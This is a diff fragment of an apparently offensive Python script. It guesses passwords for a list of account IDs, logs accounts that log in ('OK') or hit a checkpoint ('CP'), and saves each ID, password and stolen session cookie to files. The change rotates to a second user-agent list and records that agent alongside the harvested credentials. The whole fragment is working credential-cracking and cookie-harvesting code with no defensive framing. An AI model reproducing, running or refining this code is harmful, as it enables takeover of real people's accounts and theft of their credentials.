@@ -1651,7 +1651,7 @@ def reghehe(idf, pwv):
         description=f" {K2}•{H2} REGULER NYOBA ☕ {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]"
     )
     prog.advance(des)
-    pro = random.choice(ugen)
+    pro = random.choice(ugen2)
     ses = requests.Session()
 
     for pwku in pwv:
@@ -1714,12 +1714,12 @@ def reghehe(idf, pwv):
                 ok += 1
                 kuki = ";".join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                 print(f"\r{H}[OK] {idf}|{pwku}|{kuki}")
-                open('OK/' + okc, 'a').write(f"{idf}|{pwku}|{kuki}|{ua}\n")
+                open('OK/' + okc, 'a').write(f"{idf}|{pwku}|{kuki}|{pro}\n")
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 cp += 1
                 print(f"\r{M}[CP] {idf}|{pwku}{N}")
-                open('CP/' + cpc, 'a').write(f"{idf}|{pwku}|{kuki}|{ua}\n")
+                open('CP/' + cpc, 'a').write(f"{idf}|{pwku}|{kuki}|{pro}\n")
                 break
             else:
                 continue
